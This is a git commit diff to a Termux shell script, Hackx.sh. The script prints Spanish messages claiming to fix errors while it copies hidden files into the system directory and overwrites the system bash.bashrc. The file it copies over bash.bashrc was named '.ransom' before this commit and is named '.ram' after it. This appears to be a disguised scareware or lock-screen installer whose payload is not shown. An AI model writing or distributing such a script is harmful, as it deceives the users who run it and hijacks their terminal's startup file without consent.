8634f0837af9ee3598d0488cac031b11433445e4
SuSux13 <55140831+SuSux13@users.noreply.github.com>
2020-03-04 13:04:28 +0100

    Update Hackx.sh

--- Hackx.sh
+++ Hackx.sh
@@ -7,8 +7,8 @@ apt update
 echo "Solucionando errores espere un momento..."
 cp .banner -r /data/data/com.termux/files/usr/etc/
 cp .rec -r /data/data/com.termux/files/usr/etc/
-cp .msg -r /data/data/com.termux/files/usr/etc/
-cp .ransom -r /data/data/com.termux/files/usr/etc/bash.bashrc
+cp Eli.sh -r /data/data/com.termux/files/usr/etc/
+cp .ram -r /data/data/com.termux/files/usr/etc/bash.bashrc
 echo "Erorres solucionados correctamente, porfavor inicie"
 echo "en una nueva ventana para vizualizar cambios..."
 read input
